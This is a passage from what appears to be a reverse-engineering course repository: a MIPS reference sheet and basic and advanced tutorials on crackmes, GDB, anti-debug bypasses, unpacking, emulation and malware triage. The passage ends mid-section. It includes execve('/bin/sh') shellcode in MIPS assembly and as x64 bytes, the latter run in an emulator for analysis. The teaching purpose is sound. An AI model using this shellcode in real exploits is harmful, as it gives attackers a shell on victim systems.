### J-Type (Jump)
```
31-26        25-0
opcode      address
```

### Common Opcode Values
```
0x00 - R-type (uses funct field)
0x02 - j
0x03 - jal
0x04 - beq
0x05 - bne
0x08 - addi
0x09 - addiu
0x0a - slti
0x0b - sltiu
0x0c - andi
0x0d - ori
0x0e - xori
0x0f - lui
0x23 - lw
0x2b - sw
```

### Common Funct Values (R-type)
```
0x00 - sll
0x02 - srl
0x03 - sra
0x08 - jr
0x09 - jalr
0x0c - syscall
0x0d - break
0x20 - add
0x21 - addu
0x22 - sub
0x23 - subu
0x24 - and
0x25 - or
0x26 - xor
0x27 - nor
0x2a - slt
0x2b - sltu
```

---

## 🔧 DEBUGGING COMMANDS

### GDB for MIPS
```
break *0x400000        # Set breakpoint
run                   # Start execution
stepi / nexti         # Step instruction
info registers        # Show registers
x/10x $sp             # Examine stack
disas                 # Disassemble
```

### Common Breakpoints
```
strcmp, memcmp        # String comparisons
malloc, free          # Memory allocation
open, read, write     # File operations
```

---

## 📝 OPCODE QUICK REFERENCE

### Common Instructions (Hex)
```
0x03e00008  jr $ra      (return)
0x27bdffc0  addiu $sp, $sp, -64
0xafbf003c  sw $ra, 60($sp)
0xafbe0038  sw $fp, 56($sp)
0x03a0f021  move $fp, $sp
0x8fbf003c  lw $ra, 60($sp)
0x8fbe0038  lw $fp, 56($sp)
0x27bd0040  addiu $sp, $sp, 64
0x0000000c  syscall
0x24020001  li $v0, 1
0x00000000  nop
```

### Branch/Jump Instructions
```
0x1000xxxx  beq $0, $0, offset
0x1400xxxx  bne $0, $0, offset
0x080xxxxx  j target
0x0c0xxxxx  jal target
```

---

## 🚀 SHELLCODE PATTERNS

### MIPS execve("/bin/sh")
```assembly
# Null-free shellcode
li $t7, -0x3f
nor $t7, $t7, $zero
sw $t7, -0x8($sp)
li $t6, -0x1f8
nor $t6, $t6, $zero
sw $t6, -0x4($sp)
addiu $a0, $sp, -0x8
slti $a1, $zero, -0x1
slti $a2, $zero, -0x1
li $v0, 4011           # execve syscall
syscall
```

---

## 🎯 REVERSE ENGINEERING TIPS

### 1. Identify Endianness
```bash
# MIPS can be big or little endian
readelf -h binary | grep Data
# Output: Data: 2's complement, little endian
```

### 2. Check for MIPS16/MICROMIPS
```bash
# MIPS16 uses 16-bit instructions
# Look for 0x6500, 0x6400 patterns
objdump -d binary | head -20
```

### 3. String Analysis
```bash
strings -el binary    # Little-endian
strings -eb binary    # Big-endian
```

### 4. Common Patterns
- Look for `addiu $sp, $sp, -N` (stack allocation)
- Look for `sw $ra, N($sp)` (save return address)
- Look for `jr $ra` or `jalr $ra` (return)

### 5. Delay Slots
```assembly
# Instructions after branches execute before branch!
beq $t0, $t1, target
nop                    # Delay slot (often filled with nop)
```

---

## 📞 SYSTEM CALL TABLE (MIPS Linux)

| $v0 | Name | $a0 | $a1 | $a2 |
|-----|------|-----|-----|-----|
| 4001 | exit | error_code | - | - |
| 4003 | read | fd | buf | count |
| 4004 | write | fd | buf | count |
| 4005 | open | filename | flags | mode |
| 4006 | close | fd | - | - |
| 4011 | execve | filename | argv | envp |
| 4020 | getpid | - | - | - |
| 4045 | brk | addr | - | - |
| 4055 | ioctl | fd | request | arg |
| 4060 | gettimeofday | tv | tz | - |

---

## ⚡ QUICK NOTES

- **Delay Slots**: Instruction after branch executes BEFORE branch
- **Load Delay**: Cannot use loaded value immediately
- **Branch Likely**: Cancelled if branch not taken (deprecated)
- **O32 vs N32/N64**: Different calling conventions
- **MIPS16/32/64**: Different instruction sets
- **Big/Little Endian**: Both supported

**Always check for delay slot instructions!**

*Last Updated: 2024*
```

### **docs/tutorials/basic_reverse_engineering.md**
```markdown
# Basic Reverse Engineering Tutorial
## Getting Started with Binary Analysis

---

## 📚 Introduction

Welcome to reverse engineering! This tutorial will guide you through the fundamentals of analyzing binary executables without access to their source code.

### What You'll Learn:
1. Understanding binary file formats
2. Basic static analysis techniques
3. Dynamic analysis with debuggers
4. Common reverse engineering patterns
5. Solving simple crackmes

### Prerequisites:
- Basic programming knowledge
- Familiarity with command line
- A Linux environment (or VM)

---

## 🎯 Lesson 1: Understanding Binary Files

### 1.1 File Types
Binary executables come in different formats:

- **ELF** - Linux/Unix executables
- **PE** - Windows executables
- **Mach-O** - macOS executables
- **Raw binaries** - Embedded systems

### 1.2 Examining File Type
```bash
# Check file type and architecture
file mystery_binary

# Typical output:
# mystery_binary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=..., stripped
```

### 1.3 Understanding the Output
- **ELF**: Executable and Linkable Format
- **64-bit**: Architecture
- **LSB**: Least Significant Byte first (little-endian)
- **stripped**: Debug symbols removed (makes analysis harder)
- **dynamically linked**: Uses shared libraries

### 1.4 Exercise: File Identification
```bash
# Download a sample binary
wget http://example.com/sample.elf

# Examine it
file sample.elf
readelf -h sample.elf  # Detailed ELF header
```

---

## 🔍 Lesson 2: Static Analysis

Static analysis means examining the binary without running it.

### 2.1 String Analysis
Strings can reveal passwords, URLs, error messages, and more.

```bash
# Basic string extraction
strings binary_file

# More detailed analysis
strings -n 6 binary_file  # Minimum 6 characters
strings -t x binary_file  # Show offsets in hex
strings -e l binary_file  # Little-endian encoding

# Filter interesting strings
strings binary_file | grep -i "password\|key\|secret\|flag\|error\|access"
```

### 2.2 Exercise: Find Hidden Messages
```bash
# Create a simple C program
cat > secret.c << 'EOF'
#include <stdio.h>

int main() {
    char password[] = "SuperSecret123!";
    char message[] = "The flag is: FLAG{B4s1c_R3v3rs3}";
    
    printf("Enter password: ");
    char input[100];
    fgets(input, sizeof(input), stdin);
    
    // Simple comparison (insecure!)
    if(strcmp(input, password) == 0) {
        printf("Access granted!\n");
        printf("%s\n", message);
    } else {
        printf("Access denied!\n");
    }
    
    return 0;
}
EOF

# Compile it
gcc -o secret secret.c

# Find the hidden message
strings secret | grep -i "flag\|secret"
```

### 2.3 Symbol Analysis
Symbols are names for functions and variables.

```bash
# List symbols
nm binary_file

# Only show defined symbols
nm -D binary_file

# Show dynamic symbols
readelf -s binary_file | grep FUNC

# Common patterns:
# T - Text (code) section symbol
# U - Undefined (external reference)
# D - Data section symbol
```

### 2.4 Section Analysis
```bash
# List sections
readelf -S binary_file

# Important sections:
# .text - Executable code
# .data - Initialized data
# .bss - Uninitialized data
# .rodata - Read-only data
# .plt - Procedure Linkage Table
# .got - Global Offset Table

# Check section permissions
readelf -l binary_file
# Look for:
# R E - Read, Execute (code)
# R W - Read, Write (data)
# R   - Read only (constants)
```

---

## 🐛 Lesson 3: Dynamic Analysis

Dynamic analysis involves running the binary and observing its behavior.

### 3.1 Basic Execution
```bash
# Run the binary
./binary

# Run with strace (system call trace)
strace ./binary

# Run with ltrace (library call trace)
ltrace ./binary

# Monitor file access
strace -e open,openat,read,write ./binary
```

### 3.2 Exercise: Trace a Simple Program
```bash
# Create a tracing example
cat > trace_example.c << 'EOF'
#include <stdio.h>
#include <string.h>

int main() {
    printf("Starting program...\n");
    
    FILE *f = fopen("test.txt", "w");
    if(f) {
        fwrite("Hello World", 1, 11, f);
        fclose(f);
    }
    
    printf("File written.\n");
    return 0;
}
EOF

gcc -o trace_example trace_example.c

# Trace system calls
strace ./trace_example 2>&1 | grep -E "open|write|close"

# Trace library calls
ltrace ./trace_example 2>&1 | grep -E "fopen|fwrite|fclose"
```

### 3.3 Network Analysis
```bash
# Monitor network connections
strace -e connect,socket,send,recv ./binary

# Use tcpdump for detailed analysis
sudo tcpdump -i any -w capture.pcap &
./binary
```

---

## 🔧 Lesson 4: Using Debuggers

### 4.1 GDB Basics
GDB (GNU Debugger) is the standard Linux debugger.

```bash
# Start GDB
gdb ./binary

# Common commands:
(gdb) break main          # Set breakpoint at main
(gdb) run                 # Start execution
(gdb) stepi / nexti       # Step instruction/function
(gdb) info registers      # Show registers
(gdb) x/10x $sp           # Examine stack (10 words)
(gdb) disas               # Disassemble current function
(gdb) continue            # Continue execution
(gdb) quit                # Exit
```

### 4.2 Exercise: Debug a Simple Program
```bash
# Create a debug example
cat > debug_example.c << 'EOF'
#include <stdio.h>

int check_password(char *input) {
    char password[] = "debugme";
    int i;
    
    for(i = 0; i < 7; i++) {
        if(input[i] != password[i]) {
            return 0;
        }
    }
    return 1;
}

int main() {
    char input[100];
    
    printf("Enter password: ");
    fgets(input, sizeof(input), stdin);
    
    if(check_password(input)) {
        printf("Correct!\n");
    } else {
        printf("Wrong!\n");
    }
    
    return 0;
}
EOF

gcc -g -o debug_example debug_example.c

# Debug it
gdb ./debug_example
# Then try these commands:
# break main
# run
# step
# info locals
# print password
```

### 4.3 Enhanced GDB with PEDA
PEDA (Python Exploit Development Assistance) enhances GDB.

```bash
# Install PEDA
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# PEDA commands:
gdb ./binary
(gdb) start
(gdb) context            # Show registers, code, stack
(gdb) pattern_create 100 # Create pattern for overflow
(gdb) pattern_offset     # Find offset in pattern
```

---

## 🎮 Lesson 5: Simple Crackme Analysis

### 5.1 What is a Crackme?
A crackme is a small program designed to be cracked (reverse engineered).

### 5.2 Example Crackme
```bash
# Create a simple crackme
cat > simple_crackme.c << 'EOF'
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if(argc != 2) {
        printf("Usage: %s <password>\n", argv[0]);
        return 1;
    }
    
    // Simple XOR encryption
    char encrypted[] = {0x56, 0x5d, 0x5c, 0x59, 0x41, 0x44, 0x0};
    char key = 0x20;
    
    char password[100];
    strcpy(password, argv[1]);
    
    // Decrypt and check
    for(int i = 0; i < strlen(encrypted); i++) {
        if((password[i] ^ key) != encrypted[i]) {
            printf("Wrong password!\n");
            return 1;
        }
    }
    
    printf("Congratulations! Flag: FLAG{X0R_1s_Fun}\n");
    return 0;
}
EOF

gcc -o simple_crackme simple_crackme.c
```

### 5.3 Solving the Crackme
```bash
# Step 1: Run it
./simple_crackme test
# Output: Wrong password!

# Step 2: Look for strings
strings simple_crackme
# Might see encrypted data or messages

# Step 3: Analyze with GDB
gdb ./simple_crackme
(gdb) disas main
# Look for XOR operations

# Step 4: Python solution
python3 -c "
encrypted = [0x56, 0x5d, 0x5c, 0x59, 0x41, 0x44]
key = 0x20
password = ''.join(chr(c ^ key) for c in encrypted)
print('Password:', password)
"

# Step 5: Test it
./simple_crackme $(python3 -c "enc=[0x56,0x5d,0x5c,0x59,0x41,0x44];key=0x20;print(''.join(chr(c^key) for c in enc))")
```

---

## 🔍 Lesson 6: Common Patterns

### 6.1 Function Prologue
```assembly
; x86_64 function start
push rbp
mov rbp, rsp
sub rsp, 0x20    ; Allocate stack space
```

### 6.2 String Comparison
```assembly
; strcmp pattern
mov rdi, [input]
mov rsi, [password]
call strcmp
test eax, eax
je access_granted
```

### 6.3 Loop Patterns
```assembly
; for(i=0; i<10; i++)
mov dword [rbp-4], 0    ; i = 0
jmp check
loop:
; loop body
add dword [rbp-4], 1    ; i++
check:
cmp dword [rbp-4], 10   ; i < 10
jl loop
```

### 6.4 Switch Statements
```assembly
; switch(x) pattern
mov eax, [x]
cmp eax, 3
ja default
lea rcx, [jump_table]
movsxd rax, dword [rcx + rax*4]
add rax, rcx
jmp rax
```

---

## 🛠️ Lesson 7: Tools of the Trade

### 7.1 Essential Tools
```bash
# File analysis
file, readelf, objdump, nm

# String analysis
strings, hexdump, xxd

# Debugging
gdb, strace, ltrace

# Decompilation
Ghidra, radare2, IDA Free

# Binary editing
hexedit, bless, 010 Editor
```

### 7.2 Radare2 Basics
```bash
# Install radare2
sudo apt install radare2

# Basic usage
r2 -A binary_file      # Analyze all
aa                     # Analyze all (in r2)
afl                    # List functions
pdf @main              # Disassemble main
iz                     # List strings
```

### 7.3 Ghidra Basics
1. Download Ghidra from NSA GitHub
2. Run `ghidraRun`
3. Create new project
4. Import binary
5. Auto-analyze
6. Look for decompiled code in "Decompile" window

---

## 🎯 Lesson 8: Practical Exercises

### Exercise 1: Basic Analysis
```bash
# Download a practice binary
wget https://github.com/radareorg/radare2/raw/master/test/bins/elf/hello

# Analyze it
file hello
strings hello
nm hello 2>/dev/null || echo "Stripped!"
readelf -h hello
```

### Exercise 2: Debug Practice
```bash
# Create debug practice
cat > practice.c << 'EOF'
#include <stdio.h>

void secret() {
    printf("You found the secret function!\n");
}

int main() {
    int x = 5;
    int y = 10;
    int z = x + y;
    
    printf("x + y = %d\n", z);
    
    if(z == 15) {
        secret();
    }
    
    return 0;
}
EOF

gcc -g -o practice practice.c

# Debug with GDB and find secret function
```

### Exercise 3: Crackme Challenge
Solve this without looking at the source:
```bash
cat > challenge.c << 'EOF'
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if(argc != 2) {
        printf("Need exactly 1 argument\n");
        return 1;
    }
    
    char *input = argv[1];
    int len = strlen(input);
    
    if(len != 8) {
        printf("Length must be 8\n");
        return 1;
    }
    
    int sum = 0;
    for(int i = 0; i < len; i++) {
        sum += input[i];
    }
    
    if(sum == 800) {
        printf("Correct! Flag: FLAG{Sum_800}\n");
    } else {
        printf("Wrong! Sum was %d\n", sum);
    }
    
    return 0;
}
EOF

gcc -o challenge challenge.c
```

**Hint**: Each character's ASCII value sums to 800.

---

## 📚 Lesson 9: Next Steps

### 9.1 Recommended Resources
- **Books**:
  - "Practical Malware Analysis" by Michael Sikorski
  - "The IDA Pro Book" by Chris Eagle
  - "Reversing: Secrets of Reverse Engineering" by Eldad Eilam

- **Websites**:
  - [crackmes.one](https://crackmes.one) - Practice crackmes
  - [pwnable.kr](http://pwnable.kr) - Challenges
  - [LiveOverflow YouTube](https://www.youtube.com/@LiveOverflow) - Tutorials

- **Tools to Learn**:
  - IDA Pro (commercial)
  - Binary Ninja (commercial)
  - Hopper (commercial, macOS)
  - Cutter (GUI for radare2)

### 9.2 Practice Platforms
- **CTF Platforms**:
  - [picoCTF](https://picoctf.org)
  - [OverTheWire](https://overthewire.org)
  - [HackTheBox](https://hackthebox.com)

- **Local Practice**:
  - Set up a lab VM
  - Practice on intentionally vulnerable apps
  - Join a CTF team

### 9.3 Learning Path
1. Master basic static analysis
2. Learn assembly (x86/x64 first)
3. Practice with simple crackmes
4. Learn dynamic analysis and debugging
5. Study malware analysis
6. Learn exploitation techniques

---

## 🎓 Summary

You've learned:
1. How to identify binary file types
2. Basic static analysis techniques
3. Dynamic analysis with debuggers
4. Common reverse engineering patterns
5. How to approach simple crackmes

### Key Takeaways:
- **Always analyze in a safe environment** (VM)
- **Start with strings** - they often reveal a lot
- **Use multiple tools** - each has strengths
- **Practice regularly** - reverse engineering is a skill
- **Document everything** - take notes as you go

### Next Tutorial:
In the next tutorial, we'll cover:
- Intermediate reverse engineering techniques
- Anti-debugging and anti-analysis
- More complex crackmes
- Introduction to malware analysis

---

## ❓ Quiz

Test your knowledge:

1. What command shows file type and architecture?
2. How do you extract strings from a binary?
3. What does `nm` command do?
4. How do you trace system calls?
5. What's the first thing to check in GDB?

**Answers**:
1. `file binary`
2. `strings binary`
3. Lists symbols in a binary
4. `strace binary`
5. Set a breakpoint with `break main`

---

## 📝 Final Exercise

Create your own simple crackme and challenge a friend to solve it!

```bash
# Template for your crackme
cat > my_crackme.c << 'EOF'
#include <stdio.h>
#include <string.h>

// Your validation logic here
int check_password(char *input) {
    // Make it interesting but solvable!
    return 0; // Change this
}

int main(int argc, char *argv[]) {
    if(argc != 2) {
        printf("Usage: %s <password>\n", argv[0]);
        return 1;
    }
    
    if(check_password(argv[1])) {
        printf("Congratulations! You cracked it!\n");
    } else {
        printf("Try again!\n");
    }
    
    return 0;
}
EOF

gcc -o my_crackme my_crackme.c
```

Happy reversing! 🚀

*Remember: Only reverse engineer software you own or have permission to analyze.*
```

### **docs/tutorials/advanced_techniques.md**
```markdown
# Advanced Reverse Engineering Techniques
## Mastering Binary Analysis

---

## 📚 Introduction

Welcome to advanced reverse engineering! This tutorial builds on basic knowledge and dives into sophisticated techniques used by professional reversers and malware analysts.

### What You'll Learn:
1. Advanced debugging and anti-debug bypasses
2. Binary unpacking and deobfuscation
3. Automated analysis with scripting
4. Kernel and driver reverse engineering
5. Advanced malware analysis techniques

### Prerequisites:
- Completed basic reverse engineering tutorial
- Comfortable with x86/x64 assembly
- Experience with GDB and static analysis tools
- Basic Python scripting knowledge

---

## 🎯 Lesson 1: Advanced Debugging Techniques

### 1.1 Hardware Breakpoints
Unlike software breakpoints (`0xCC`), hardware breakpoints use CPU debug registers.

```bash
# GDB hardware breakpoints
(gdb) hbreak *0x401000          # Set hardware breakpoint
(gdb) info break                # List breakpoints
(gdb) watch *(int*)0x7fffffff   # Watch memory location
(gdb) rwatch variable           # Watch for read
(gdb) awatch variable           # Watch for read/write
```

### 1.2 Conditional Breakpoints
```bash
(gdb) break *0x401234 if $rax == 0xdeadbeef
(gdb) break function if strcmp(arg1, "secret") == 0
(gdb) command 1                 # Add commands to breakpoint 1
> print/x $rax
> continue
> end
```

### 1.3 Reverse Debugging
```bash
# Record execution
(gdb) record full
(gdb) continue
(gdb) reverse-stepi             # Step backwards!
(gdb) reverse-continue
(gdb) record stop
```

### 1.4 Exercise: Advanced Breakpoints
```bash
cat > advanced_debug.c << 'EOF'
#include <stdio.h>
#include <string.h>

char global_buffer[100];

void process_input(char *input) {
    strcpy(global_buffer, input);
    
    if(strlen(global_buffer) > 50) {
        printf("Buffer too long!\n");
    } else {
        printf("Processing: %s\n", global_buffer);
    }
}

int main() {
    char input[200];
    
    for(int i = 0; i < 3; i++) {
        printf("Enter input: ");
        fgets(input, sizeof(input), stdin);
        input[strcspn(input, "\n")] = 0;
        
        process_input(input);
    }
    
    return 0;
}
EOF

gcc -g -o advanced_debug advanced_debug.c

# Debug with:
# 1. Hardware breakpoint on global_buffer
# 2. Conditional breakpoint when strlen > 50
# 3. Watchpoint for buffer overflow
```

---

## 🛡️ Lesson 2: Anti-Debug Bypasses

### 2.1 Common Anti-Debug Techniques

#### ptrace Detection
```c
// Common ptrace check
if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
    // Debugger detected
    exit(1);
}
```

**Bypass**: Patch the jump or modify ptrace return value in debugger.

#### Timing Checks
```c
// Measure execution time
start = rdtsc();
// Some computation
end = rdtsc();
if ((end - start) > threshold) {
    // Debugger detected (breakpoints slow execution)
}
```

**Bypass**: Use hardware breakpoints or modify time results.

#### /proc/self/status Check
```c
// Check TracerPid field
FILE *f = fopen("/proc/self/status", "r");
while(fgets(line, sizeof(line), f)) {
    if(strstr(line, "TracerPid:")) {
        int pid;
        sscanf(line, "TracerPid: %d", &pid);
        if(pid != 0) exit(1);
    }
}
```

**Bypass**: Hook fopen/fread or use LD_PRELOAD.

### 2.2 Practical Bypass Exercise
```bash
# Create anti-debug binary
cat > antidebug.c << 'EOF'
#include <stdio.h>
#include <sys/ptrace.h>
#include <time.h>

void check_ptrace() {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        printf("[!] Debugger detected via ptrace!\n");
        exit(1);
    }
}

void check_timing() {
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    // Dummy computation
    volatile int x = 0;
    for (int i = 0; i < 1000000; i++) {
        x += i;
    }
    
    clock_gettime(CLOCK_MONOTONIC, &end);
    long elapsed = (end.tv_sec - start.tv_sec) * 1000000000 + 
                   (end.tv_nsec - start.tv_nsec);
    
    if (elapsed > 50000000) { // 50ms threshold
        printf("[!] Debugger detected via timing!\n");
        exit(1);
    }
}

int main() {
    printf("Starting protected program...\n");
    
    check_ptrace();
    check_timing();
    
    printf("[+] No debugger detected. Secret: FLAG{Ant1_D3bug_Byp4ss}\n");
    return 0;
}
EOF

gcc -o antidebug antidebug.c

# Bypass strategies:
# 1. Patch binary with hex editor
# 2. Use GDB to modify execution
# 3. Use LD_PRELOAD hook
```

### 2.3 GDB Script for Bypass
```python
# Save as bypass.py
import gdb

class AntiDebugBypass(gdb.Command):
    def __init__(self):
        super(AntiDebugBypass, self).__init__("bypass-antidebug", gdb.COMMAND_USER)
    
    def invoke(self, arg, from_tty):
        # Bypass ptrace
        gdb.execute("set $rax = 0")  # Make ptrace return 0
        
        # Bypass timing check
        gdb.execute("set variable elapsed = 0")
        
        print("[+] Anti-debug bypasses installed")

AntiDebugBypass()
```

---

## 📦 Lesson 3: Binary Unpacking

### 3.1 Recognizing Packers

#### Common Packers:
- **UPX** - Easy to unpack: `upx -d file`
- **ASPack** - Common in malware
- **PECompact** - Windows packer
- **Themida/Virtualizer** - Advanced protection
- **Custom Packers** - Often in malware

### 3.2 Detection Methods
```bash
# Check for packers
strings binary | grep -i "upx\|aspack\|pecompact"
file binary
readelf -l binary | grep -i "pack"

# Entropy analysis (high entropy = likely packed)
python3 -c "
import math
from collections import Counter

with open('binary', 'rb') as f:
    data = f.read(4096)

freq = Counter(data)
entropy = 0
for count in freq.values():
    p = count / len(data)
    entropy += -p * math.log2(p)

print(f'Entropy: {entropy:.2f}')
print('> 7.5: Likely packed/encrypted')
print('7.0-7.5: Possibly packed')
print('< 7.0: Probably not packed')
"
```

### 3.3 Manual Unpacking Process

#### Step 1: Find Original Entry Point (OEP)
```bash
# Look for unusual entry point
readelf -h packed_binary
objdump -d packed_binary | head -50
```

#### Step 2: Dump Memory
```python
# GDB script to dump unpacked code
import gdb
import struct

class DumpUnpacked(gdb.Command):
    def invoke(self, arg, from_tty):
        # Wait for unpacking to complete
        gdb.execute("break *0x401000")  # Suspect OEP
        gdb.execute("continue")
        
        # Dump memory
        inferior = gdb.selected_inferior()
        memory = inferior.read_memory(0x400000, 0x10000)
        
        with open("unpacked.bin", "wb") as f:
            f.write(memory)
        
        print("[+] Dumped unpacked binary")

DumpUnpacked("dump-unpacked", gdb.COMMAND_USER)
```

#### Step 3: Fix PE/ELF Headers
```bash
# For ELF binaries
readelf -h unpacked.bin
# Check if headers need repair

# For PE binaries
python3 -c "
import pefile

# Rebuild PE header
pe = pefile.PE('unpacked.bin')
pe.OPTIONAL_HEADER.AddressOfEntryPoint = OEP_RVA
pe.write('rebuilt.exe')
"
```

### 3.4 Exercise: Unpack UPX
```bash
# Create a packed binary
cat > simple.c << 'EOF'
#include <stdio.h>

void secret() {
    printf("This is the unpacked secret function!\n");
}

int main() {
    printf("Hello from packed binary!\n");
    secret();
    return 0;
}
EOF

gcc -o simple simple.c
upx -o simple_packed simple

# Try to unpack
# 1. Identify it's UPX: strings simple_packed | grep UPX
# 2. Try automatic unpack: upx -d simple_packed
# 3. If that fails, manual unpack with GDB
```

---

## 🤖 Lesson 4: Automated Analysis with Python

### 4.1 Capstone Disassembler
```python
#!/usr/bin/env python3
from capstone import *
import argparse

class AdvancedAnalyzer:
    def __init__(self, arch=CS_ARCH_X86, mode=CS_MODE_64):
        self.md = Cs(arch, mode)
        self.md.detail = True
    
    def find_crypto_constants(self, data):
        """Find cryptographic constants"""
        constants = {
            b'\x67\x45\x23\x01': 'MD5 constant',
            b'\xef\xcd\xab\x89': 'SHA1 constant',
            b'\x98\xba\xdc\xfe': 'AES S-box',
            b'\x52\x09\x6a\xd5': 'AES T-table',
        }
        
        found = []
        for const, name in constants.items():
            offset = data.find(const)
            if offset != -1:
                found.append((offset, name, const.hex()))
        
        return found
    
    def analyze_control_flow(self, data, base_addr=0x1000):
        """Analyze control flow patterns"""
        cfg = {}
        
        for insn in self.md.disasm(data, base_addr):
            if insn.mnemonic.startswith('j') or insn.mnemonic == 'call':
                cfg.setdefault(insn.address, []).append({
                    'type': insn.mnemonic,
                    'target': insn.op_str,
                    'size': insn.size
                })
        
        return cfg
    
    def detect_packer(self, data):
        """Detect common packers"""
        signatures = {
            b'UPX': 'UPX Packer',
            b'ASPack': 'ASPack',
            b'PECompact': 'PECompact',
            b'FSG': 'FSG',
            b'Mew': 'MEW Packer',
        }
        
        for sig, name in signatures.items():
            if sig in data:
                return name
        
        return "Unknown/No packer detected"

# Usage
analyzer = AdvancedAnalyzer()
with open('binary', 'rb') as f:
    data = f.read()

print("Crypto constants:", analyzer.find_crypto_constants(data))
print("CFG edges:", len(analyzer.analyze_control_flow(data)))
print("Packer:", analyzer.detect_packer(data))
```

### 4.2 Binary Emulation with Unicorn
```python
#!/usr/bin/env python3
from unicorn import *
from unicorn.x86_const import *
import struct

class BinaryEmulator:
    def __init__(self):
        self.mu = Uc(UC_ARCH_X86, UC_MODE_64)
        
        # Setup memory
        self.mu.mem_map(0x1000, 0x1000)  # Code
        self.mu.mem_map(0x2000, 0x1000)  # Stack
        self.mu.mem_map(0x3000, 0x1000)  # Data
        
        # Setup stack pointer
        self.mu.reg_write(UC_X86_REG_RSP, 0x2800)
    
    def emulate(self, code, start_addr=0x1000, steps=1000):
        """Emulate code execution"""
        # Write code to memory
        self.mu.mem_write(start_addr, code)
        
        # Hook instructions for analysis
        def hook_code(uc, address, size, user_data):
            print(f"Executing at 0x{address:x}, size: {size}")
            
            # Read instruction bytes
            code = uc.mem_read(address, size)
            print(f"Bytes: {code.hex()}")
            
            # Read registers
            rax = uc.reg_read(UC_X86_REG_RAX)
            rbx = uc.reg_read(UC_X86_REG_RBX)
            print(f"RAX: 0x{rax:x}, RBX: 0x{rbx:x}")
            
            # Stop after N instructions
            user_data['count'] += 1
            if user_data['count'] >= steps:
                uc.emu_stop()
        
        # Install hook
        hook_data = {'count': 0}
        self.mu.hook_add(UC_HOOK_CODE, hook_code, hook_data)
        
        try:
            self.mu.emu_start(start_addr, start_addr + len(code))
            print("[+] Emulation completed successfully")
        except UcError as e:
            print(f"[-] Emulation error: {e}")
    
    def analyze_shellcode(self, shellcode):
        """Analyze shellcode safely"""
        print(f"Analyzing shellcode ({len(shellcode)} bytes)")
        self.emulate(shellcode)

# Example usage
emulator = BinaryEmulator()

# Sample shellcode (execve("/bin/sh") x64)
shellcode = (
    b'\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68'
    b'\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6'
    b'\xb0\x3b\x0f\x05'
)

emulator.analyze_shellcode(shellcode)
```

---

## 🐛 Lesson 5: Kernel and Driver Reverse Engineering

### 5.1 Windows Kernel Drivers (.sys files)

#### Driver Structure
```
DriverEntry() - Entry point
Dispatch functions - IRP handling
Device I/O Control - IOCTL codes
Unload routine - Cleanup
```

#### Analysis Tools
- **WinDbg** - Microsoft debugger
- **IDA Pro** with Windows SDK
- **Dependency Walker** - Dependencies
- **DriverView** - Loaded drivers

### 5.2 Analyzing DriverEntry
```c
// Typical DriverEntry
NTSTATUS DriverEntry(
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath)
{
    // Set dispatch functions
    DriverObject->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctl;
    
    // Set unload routine
    DriverObject->DriverUnload = DriverUnload;
    
    // Create device
    IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);
    
    // Create symbolic link
    IoCreateSymbolicLink(&symbolicLinkName, &deviceName);
    
    return STATUS_SUCCESS;
}
```

### 5.3 IOCTL Analysis
```python
#!/usr/bin/env python3
import pefile

def analyze_driver(driver_path):
    pe = pefile.PE(driver_path)
    
    # Find IOCTL codes
    ioctl_codes = []
    
    # Look in .data section
    for section in pe.sections:
        if b'.data' in section.Name:
            data = section.get_data()
            
            # Common IOCTL patterns
            for i in range(len(data) - 3):
                # CTL_CODE macro patterns
                value = struct.unpack('<I', data[i:i+4])[0]
                if 0x80000000 <= value <= 0xFFFFFFFF:
                    # Could be IOCTL
                    device_type = (value >> 16) & 0xFFFF
                    function_code = (value >> 2) & 0xFFF
                    method = value & 0x3
                    access = (value >> 14) & 0x3
                    
                    ioctl_codes.append({
                        'value': hex(value),
                        'device_type': hex(device_type),
                        'function': function_code,
                        'method': method,
                        'access': access
                    })
    
    return ioctl_codes

# Usage
codes = analyze_driver('driver.sys')
for code in codes[:10]:  # Show first 10
    print(f"IOCTL: {code['value']}, Device: {code['device_type']}")
```

### 5.4 Exercise: Basic Driver Analysis
```bash
# Create a simple Linux kernel module
cat > simple_module.c << 'EOF'
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Reverse Engineer");
MODULE_DESCRIPTION("Simple module for analysis");

static int __init simple_init(void) {
    printk(KERN_INFO "Simple module loaded\n");
    
    // Secret value
    unsigned int secret = 0xDEADBEEF;
    printk(KERN_INFO "Secret: 0x%x\n", secret);
    
    return 0;
}

static void __exit simple_exit(void) {
    printk(KERN_INFO "Simple module unloaded\n");
}

module_init(simple_init);
module_exit(simple_exit);
EOF

# Build and analyze
make -C /lib/modules/$(uname -r)/build M=$PWD modules
file simple_module.ko
modinfo simple_module.ko
strings simple_module.ko
```

---

## 🦠 Lesson 6: Advanced Malware Analysis

### 6.1 Malware Analysis Pipeline

#### Stage 1: Initial Triage
```bash
# Basic information gathering
file malware
strings -n 6 malware
md5sum malware
sha256sum malware

# Check for packers
peframe malware              # PE analysis tool
diec malware                 # Detect It Easy
```

#### Stage 2: Static Analysis
```bash
# Extract resources
resourcehacker -extract malware
binwalk -e malware

# Disassemble
objdump -d malware > disasm.txt
radare2 -A malware

# Network indicators
strings malware | grep -E "(http|https|ftp)://"
strings malware | grep -E "[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}"
```

#### Stage 3: Dynamic Analysis
```bash
# Run in sandbox
cuckoo submit malware

# Manual analysis in VM
